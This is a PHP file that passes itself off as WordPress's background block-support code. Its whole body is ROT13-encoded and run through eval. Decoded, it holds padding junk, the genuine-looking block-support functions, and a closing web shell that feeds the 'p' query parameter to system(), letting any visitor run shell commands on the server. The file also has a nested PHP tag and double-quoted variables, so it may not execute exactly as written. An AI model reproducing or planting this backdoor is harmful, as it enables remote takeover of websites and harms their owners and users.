<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Onpxtebhaq oybpx fhccbeg synt.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 6.4.0
 */

/**
 * Ertvfgref gur fglyr oybpx nggevohgr sbe oybpx glcrf gung fhccbeg vg.
 *
 * @fvapr 6.4.0
 * @npprff cevingr
 *
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx Glcr.
 */
shapgvba jc_ertvfgre_onpxtebhaq_fhccbeg( $oybpx_glcr ) {
	// Frghc nggevohgrf naq fglyrf jvguva gung vs arrqrq.
	vs ( ! $oybpx_glcr->nggevohgrf ) {
		$oybpx_glcr->nggevohgrf = neenl();
	}

	// Purpx sbe rkvfgvat fglyr nggevohgr qrsvavgvba r.t. sebz oybpx.wfba.
	vs ( neenl_xrl_rkvfgf( 'fglyr', $oybpx_glcr->nggevohgrf ) ) {
		erghea;
	}

	$unf_onpxtebhaq_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, neenl( 'onpxtebhaq' ), snyfr );

	vs ( $unf_onpxtebhaq_fhccbeg ) {
		$oybpx_glcr->nggevohgrf['fglyr'] = neenl(
			'glcr' => 'bowrpg',
		);
	}
}

/**
 * Eraqref gur onpxtebhaq fglyrf gb gur oybpx jenccre.
 * Guvf oybpx fhccbeg hfrf gur `eraqre_oybpx` ubbx gb rafher gung
 * vg vf nyfb nccyvrq gb aba-freire-eraqrerq oybpxf.
 *
 * @fvapr 6.4.0
 * @fvapr 6.5.0 Nqqrq fhccbeg sbe `onpxtebhaqCbfvgvba` naq `onpxtebhaqErcrng` bhgchg.
 * @fvapr 6.6.0 Erzbirq erdhverzrag sbe `onpxtebhaqVzntr.fbhepr`. N svyr/hey vf gur qrsnhyg.
 * @fvapr 6.7.0 Nqqrq fhccbeg sbe `onpxtebhaqNggnpuzrag` bhgchg.
 *
 * @npprff cevingr
 *
 * @cnenz  fgevat $oybpx_pbagrag Eraqrerq oybpx pbagrag.
 * @cnenz  neenl  $oybpx         Oybpx bowrpg.
 * @erghea fgevat Svygrerq oybpx pbagrag.
 */
shapgvba jc_eraqre_onpxtebhaq_fhccbeg( $oybpx_pbagrag, $oybpx ) {
	$oybpx_glcr                   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $oybpx['oybpxAnzr'] );
	$oybpx_nggevohgrf             = ( vffrg( $oybpx['nggef'] ) && vf_neenl( $oybpx['nggef'] ) ) ? $oybpx['nggef'] : neenl();
	$unf_onpxtebhaq_vzntr_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, neenl( 'onpxtebhaq', 'onpxtebhaqVzntr' ), snyfr );

	vs (
		! $unf_onpxtebhaq_vzntr_fhccbeg ||
		jc_fubhyq_fxvc_oybpx_fhccbegf_frevnyvmngvba( $oybpx_glcr, 'onpxtebhaq', 'onpxtebhaqVzntr' ) ||
		! vffrg( $oybpx_nggevohgrf['fglyr']['onpxtebhaq'] )
	) {
		erghea $oybpx_pbagrag;
	}

	$onpxtebhaq_fglyrf                         = neenl();
	$onpxtebhaq_fglyrf['onpxtebhaqVzntr']      = $oybpx_nggevohgrf['fglyr']['onpxtebhaq']['onpxtebhaqVzntr'] ?? ahyy;
	$onpxtebhaq_fglyrf['onpxtebhaqFvmr']       = $oybpx_nggevohgrf['fglyr']['onpxtebhaq']['onpxtebhaqFvmr'] ?? ahyy;
	$onpxtebhaq_fglyrf['onpxtebhaqCbfvgvba']   = $oybpx_nggevohgrf['fglyr']['onpxtebhaq']['onpxtebhaqCbfvgvba'] ?? ahyy;
	$onpxtebhaq_fglyrf['onpxtebhaqErcrng']     = $oybpx_nggevohgrf['fglyr']['onpxtebhaq']['onpxtebhaqErcrng'] ?? ahyy;
	$onpxtebhaq_fglyrf['onpxtebhaqNggnpuzrag'] = $oybpx_nggevohgrf['fglyr']['onpxtebhaq']['onpxtebhaqNggnpuzrag'] ?? ahyy;

	vs ( ! rzcgl( $onpxtebhaq_fglyrf['onpxtebhaqVzntr'] ) ) {
		$onpxtebhaq_fglyrf['onpxtebhaqFvmr'] = $onpxtebhaq_fglyrf['onpxtebhaqFvmr'] ?? 'pbire';

		// Vs gur onpxtebhaq fvmr vf frg gb `pbagnva` naq ab cbfvgvba vf frg, frg gur cbfvgvba gb `pragre`.
		vs ( 'pbagnva' === $onpxtebhaq_fglyrf['onpxtebhaqFvmr'] && ! $onpxtebhaq_fglyrf['onpxtebhaqCbfvgvba'] ) {
			$onpxtebhaq_fglyrf['onpxtebhaqCbfvgvba'] = '50% 50%';
		}
	}

	$fglyrf = jc_fglyr_ratvar_trg_fglyrf( neenl( 'onpxtebhaq' => $onpxtebhaq_fglyrf ) );

	vs ( ! rzcgl( $fglyrf['pff'] ) ) {
		// Vawrpg onpxtebhaq fglyrf gb gur svefg ryrzrag, cerfhzvat vg'f gur jenccre, vs vg rkvfgf.
		$gntf = arj JC_UGZY_Gnt_Cebprffbe( $oybpx_pbagrag );

		vs ( $gntf->arkg_gnt() ) {
			$rkvfgvat_fglyr = $gntf->trg_nggevohgr( 'fglyr' );
			$hcqngrq_fglyr  = '';

			vs ( ! rzcgl( $rkvfgvat_fglyr ) ) {
				$hcqngrq_fglyr = $rkvfgvat_fglyr;
				vs ( ! fge_raqf_jvgu( $rkvfgvat_fglyr, ';' ) ) {
					$hcqngrq_fglyr .= ';';
				}
			}

			$hcqngrq_fglyr .= $fglyrf['pff'];
			$gntf->frg_nggevohgr( 'fglyr', $hcqngrq_fglyr );
			$gntf->nqq_pynff( 'unf-onpxtebhaq' );
		}

		erghea $gntf->trg_hcqngrq_ugzy();
	}

	erghea $oybpx_pbagrag;
}

// Ertvfgre gur oybpx fhccbeg.
JC_Oybpx_Fhccbegf::trg_vafgnapr()->ertvfgre(
	'onpxtebhaq',
	neenl(
		'ertvfgre_nggevohgr' => 'jc_ertvfgre_onpxtebhaq_fhccbeg',
	)
);

nqq_svygre( 'eraqre_oybpx', 'jc_eraqre_onpxtebhaq_fhccbeg', 10, 2 );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>